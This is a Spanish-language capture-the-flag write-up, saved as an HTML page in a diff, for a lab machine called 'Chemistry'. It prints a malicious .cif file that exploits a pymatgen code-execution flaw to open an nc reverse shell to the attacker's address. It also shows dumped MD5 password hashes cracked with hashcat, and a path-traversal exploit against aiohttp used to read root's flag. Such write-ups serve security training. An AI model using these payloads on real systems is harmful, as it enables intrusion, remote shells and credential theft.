@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./agile.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Agile</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
+<pre><code class="language-bash">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
+|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
+|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
+5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
+|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
+|_http-title: Chemistry - Home
+8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
+|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
+|_http-title: Directory listing for /
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="2-explotación">2. Explotación</h2>
+<p>Si entramos en el servicio web del puerto 5000 vemos un servicio en el, que luego de registrarnos, podemos subir archivos .cif. Buscando por internet posibles exploits sobre dichos archivos, encontramos lo siguiente: <a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></p>
+<p>La pagina web del puerto 5000, nos proporciona un fichero .cif de ejemplo, por lo que congiendo dicho exploit y dicho fichero de ejemplo podemos elaborar el siguiente exploit:</p>
+<pre><code class="language-bash">data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;nc 10.10.14.118 9001 -e /bin/sh&quot;);0,0,0&#39;
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  &quot;P  n&#39;  m  a&#39;  &quot;
+</code></pre>
+<p>Vemos que si abrimos una revershell con nc en nuestro equipo no recibimos ninguna conexión. Podemos probar a utilizar <strong>busybox</strong> para crear la revershell desde la máquina objetivo:</p>
+<pre><code class="language-bash">data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;busybox nc 10.10.14.118 9001 -e /bin/sh&quot;);0,0,0&#39;
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  &quot;P  n&#39;  m  a&#39;  &quot;
+</code></pre>
+<p>Conseguimos entonces acceder a través del usuario &quot;app&quot;. Para establecer una conexión persistente, añadimos una clave ssh en el fichero <code>.ssh/authorized_keys</code> del directorio home del usuario app.</p>
+<p>&nbsp;</p>
+<h2 id="3-movimiento-lateral">3. Movimiento lateral</h2>
+<p>Podemos observar como dicho usuario no tiene la flag de usuario en su directorio, por lo que tenemos que buscarlo en otros usuarios. Descubrimos el archivo app.py, en el directorio /home de app, el cual tiene el siguiente contenido:</p>
+<pre><code class="language-bash">app = Flask(__name__)
+app.config[&#39;SECRET_KEY&#39;] = &#39;MyS3cretCh3mistry4PP&#39;
+app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;sqlite:///database.db&#39;
+app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;uploads/&#39;
+app.config[&#39;ALLOWED_EXTENSIONS&#39;] = {&#39;cif&#39;}
+</code></pre>
+<p>Descrubimos que dicha database.db, se encuentra en la carpeta /home/app/CimInstance y que en ella podemos ver lo siguiente:</p>
+<pre><code class="language-bash">app@chemistry:~/instance$ sqlite3 database.db 
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; .tables
+structure  user     
+sqlite&gt; .database
+main: /home/app/instance/database.db
+sqlite&gt; .tables
+structure  user     
+sqlite&gt; select * from user;
+1|admin|2861debaf8d99436a10ed6f75a252abf
+2|app|197865e46b878d9e74a0346b6d59886a
+3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+4|robert|02fcf7cfc10adc37959fb21f06c6b467
+5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+</code></pre>
+<p>Si listamos los directorio /home de la máquina podemos ver que existe un usuario que se llama rosa. En el app.py vemos que utiliza un hash md5, por lo que podemos aplicar fuerza bruta para intentar obtener su contraseña:</p>
+<pre><code class="language-bash"># hashcat -m 0 hashes /usr/share/wordlist/rockyou.txt
+</code></pre>
+<p>Y vemos que obtenemos las siguientes credenciales <code>rosa:unicorniosrosados</code>. Accedemos entonces por ssh con dicho usuario, y vemos que somos capaces de obtener la flag de usuario.</p>
+<p>&nbsp;</p>
+<h2 id="4-escalado-de-privilegios">4. Escalado de privilegios</h2>
+<p>Listando las interfaces de red de la máquina, vemos lo que parece un servicio web en el puerto 8080. Por lo que lo forwardeamos a nuestra maquina:</p>
+<pre><code class="language-bash"># ssh -L 1234:127.0.0.1:8080 rosa@10.10.11.38
+</code></pre>
+<p>Si enumeramos con <strong>whatweb</strong> las tecnologías utilizadas en dicha página, vemos lo siguiente:</p>
+<pre><code class="language-bash"># whatweb http://127.0.0.1:1235
+    http://127.0.0.1:1235 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[127.0.0.1], JQuery[3.6.0], Script, Title[Site Monitoring]
+</code></pre>
+<p>Si buscamos en internet por algun exploit que afecte a <strong>aiohttp</strong> en su versión 3.9.1 descubrimos el siguiente LFI: <a href="https://github.com/wizarddos/CVE-2024-23334">https://github.com/wizarddos/CVE-2024-23334</a>. Si lo descargamos y ejecutamos buscando por el archivo <strong>/root/root.txt</strong> y con el directorio predefinido, vemos que no funciona.</p>
+<p>Por lo que tenemos que lanzar gobuster para descubrir el directorio sobre el que realizar el LFI. Lo lanzamos con <strong>gobuster</strong> y obtenemos lo siguiente:</p>
+<pre><code class="language-bash">/assets               (Status: 403) [Size: 14]
+</code></pre>
+<p>Por lo que podemos adaptar el exploit utilizando el directorio <code>/assets</code>:</p>
+<pre><code class="language-bash"># python exploit.py -u http://127.0.0.1:1235 -f /root/root.txt -d /assets
+</code></pre>
+<p>Y vemos como somos capaces de obtener la flag del usuario root.</p>
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
